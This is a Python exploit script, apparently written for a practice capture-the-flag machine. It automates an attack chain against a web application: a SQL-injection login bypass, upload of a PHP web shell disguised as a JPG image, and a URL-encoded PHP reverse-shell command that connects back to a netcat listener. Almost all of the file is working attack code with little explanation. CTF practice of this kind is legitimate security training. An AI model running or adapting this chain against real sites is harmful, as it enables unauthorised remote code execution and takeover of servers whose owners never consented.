# Author: Chris
#
# For use in a practice CTF scenario
# Created: 8 May 2020
# 	This program automates the reverse shell process by performing a sqli, uploading the payloaded image, 
# 	and listening for the reverse shell command
# TO DO:
# [+] Implement getopt
# [ ] Brute Force SQLi based on list
# [ ] Create list of payloads
# [ ] Comments

# Libraries
import requests
import threading
import os
import sys
import getopt

# Colors
cyan 	= "\033[0;96m"
green 	= "\033[0;92m"
white 	= "\033[0;97m"
red 	= "\033[0;91m"
blue 	= "\033[0;94m"
yellow 	= "\033[0;33m"
magenta = "\033[0;35m"

# Variables
url = 'http://10.10.10.185/login.php'
values = {'username': '\' or 1=1 --', 'password': '\' or 1=1 --'}
files = {'image': open('payloads/sponge.php.jpg', 'rb')}
data = {'submit':'Upload Image'}

# Methods
def exploit_req():
	req = sesh.get(url2)
def start_listener():
	os.system('nc -nlp ' + host_port)

def usage():
	print("Usage: magic-jack.py -s <host IP> -p <listening port> OR magic-jack.py -h")
	print("DETAILS:\n  -s <host IP>: host IP")
	print("  -p <listening port>: Port awaiting reverse shell")
	print("  -h: Display this information\n")

# parse options, display error/usage if option not recognized
try:
	options, args = getopt.getopt(sys.argv[1:], "s:p:h")
except getopt.GetoptError as err:
	print(str(err))  # will print something like "option -a not recognized"
	usage()
	sys.exit(2)

# declare variables based on user inputs or display help/usage
for opt, arg in options:
	if opt in ('-s'):
		host_ip = arg
	elif opt in ('-p'):
		host_port = arg
	elif opt in ('-h'):
		usage()
		sys.exit()

print(magenta + "\n       ===" + yellow + "Magic" + magenta + "-" + yellow + "Jack" + magenta + "===\n" + white)

# Print IP address and listening port. If it fails, notify user and display usage.
try:
	print(magenta + "       HOST IP :" + yellow + " " + host_ip + white)
except:
	print(magenta + "       HOST IP :" + red + " MISSING" + white)
	try:	
		print(magenta + "LISTENING PORT :" + yellow + " " + host_port + "\n" + white)
	except:
		print(magenta + "LISTENING PORT :" + red + " MISSING\n" + white)
		usage()
		sys.exit(2)
	usage()
	sys.exit(2)

try:	
	print(magenta + "LISTENING PORT :" + yellow + " " + host_port + "\n" + white)
except:
	print(magenta + "LISTENING PORT :" + red + " MISSING\n" + white)
	usage()
	sys.exit(2)

# Create variable with encoded reverse shell command URL, start request session
url2 = 'http://10.10.10.185/images/uploads/sponge.php.jpg?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22' + host_ip + '%22%2C' + host_port + '%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
sesh = requests.session()

# Test connection to target site using a GET request, timeout set to 3 seconds
try:
	print(blue + "[*] Checking connection to target..." + white)
	req = sesh.get(url, timeout = 3)
except:
	print(red + "[-] Connection error. Exiting...\n" + white)
	sys.exit()

print(green + "[+] Target available.")

# Perform a POST request with the login values to attempt a SQL injection
print(blue + "[*] Attempting SQL injection...")
req = sesh.post(url, data=values)

# If a 200 response is received and the page is a new URL (not login.php), assume a successful login
if (req.status_code == 200) and (req.url != url):
	print(green + "[+] Login successful.")
else:
	print(red + "[-] Error Logging in. Exiting...\n" + white)
	sys.exit()

print(blue + "[*] Uploading image payload..." + white)
req = sesh.post(req.url, data=data, files=files)

req = sesh.get('http://10.10.10.185/images/uploads/sponge.php.jpg')

if (req.status_code == 200):
	print(green + "[+] Payload upload successful." + white)
else:
	print(red + "[-] Error uploading payload. Exiting...\n" + white)
	sys.exit()

print(blue + "[*] Starting reverse shell..." + white)
t1 = threading.Thread(target=start_listener)
t2 = threading.Thread(target=exploit_req)
t1.start()
t2.start()

print(green + "[+] Connection successful.\n" + white)


